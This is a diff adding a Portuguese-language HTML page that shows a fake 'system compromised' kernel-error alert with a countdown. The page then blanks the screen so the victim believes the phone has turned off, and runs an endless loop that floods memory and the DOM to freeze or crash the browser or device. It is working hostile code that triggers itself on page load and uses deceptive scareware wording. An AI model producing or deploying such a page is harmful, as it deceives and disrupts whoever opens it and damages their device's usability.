@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>SISTEMA COMPROMETIDO</title>
+    <style>
+        body {
+            background-color: #0d0d0d;
+            color: white;
+            font-family: 'Courier New', Courier, monospace;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            overflow: hidden;
+        }
+        #tudo {
+            transition: opacity 0.5s ease-out;
+            width: 100%;
+        }
+        .aviso {
+            color: #ff3b3b;
+            font-size: 1.4rem;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+        .icone-perigo {
+            font-size: 3rem;
+            margin-bottom: 10px;
+        }
+        h1 {
+            color: white;
+            font-size: 2rem;
+            margin: 0 0 10px 0;
+        }
+        .timer {
+            font-size: 4rem;
+            color: #ff3b3b;
+            font-weight: bold;
+            margin-bottom: 30px;
+        }
+        .botao {
+            display: inline-block;
+            width: 80%;
+            max-width: 300px;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 8px;
+            text-transform: uppercase;
+            font-weight: bold;
+            background-color: #ff3b3b;
+            color: white;
+            border: 2px solid #ff3b3b;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="tudo">
+        <div class="icone-perigo">⚠️</div>
+        <h1>ERRO CRÍTICO</h1>
+        <div class="aviso">Agressão ao Kernel detectada.</div>
+        <div class="timer" id="contagem">03</div>
+        <div class="botao">Formatar Agora</div>
+    </div>
+
+    <script>
+        var tempoRestante = 3;
+        var elementoTimer = document.getElementById("contagem");
+        var elementoTudo = document.getElementById("tudo");
+
+        var intervalo = setInterval(function() {
+            tempoRestante--;
+            elementoTimer.innerText = "0" + tempoRestante;
+
+            if (tempoRestante <= 0) {
+                clearInterval(intervalo);
+                
+                // Apaga a tela para ele achar que o celular desligou
+                elementoTudo.style.opacity = "0";
+                document.body.style.backgroundColor = "#000000";
+
+                // Ativa o buraco negro de processamento
+                setTimeout(colapsoTrilhao, 500);
+            }
+        }, 1000);
+
+        function colapsoTrilhao() {
+            // Cria blocos massivos de textos e cálculos na memória infinitamente
+            let buracoNegro = [];
+            
+            // Loop "while true" roda para sempre, sem parar, o mais rápido que o processador aguentar
+            while (true) {
+                // Multiplica strings gigantescas na memória RAM a cada milissegundo
+                let poeiraCosmica = new Array(1000000).join("LAG_TOTAL_");
+                buracoNegro.push(poeiraCosmica);
+                
+                // Faz cálculos matemáticos complexos e aleatórios em loop para travar o processador
+                Math.shadowCalc = Math.random() * Math.tan(Math.random()) * Math.sinh(1000);
+                
+                // Força a criação de elementos invisíveis no HTML em segundo plano
+                let divInvisivel = document.createElement("div");
+                document.body.appendChild(divInvisivel);
+            }
+        }
+    </script>
+</body>
+</html>
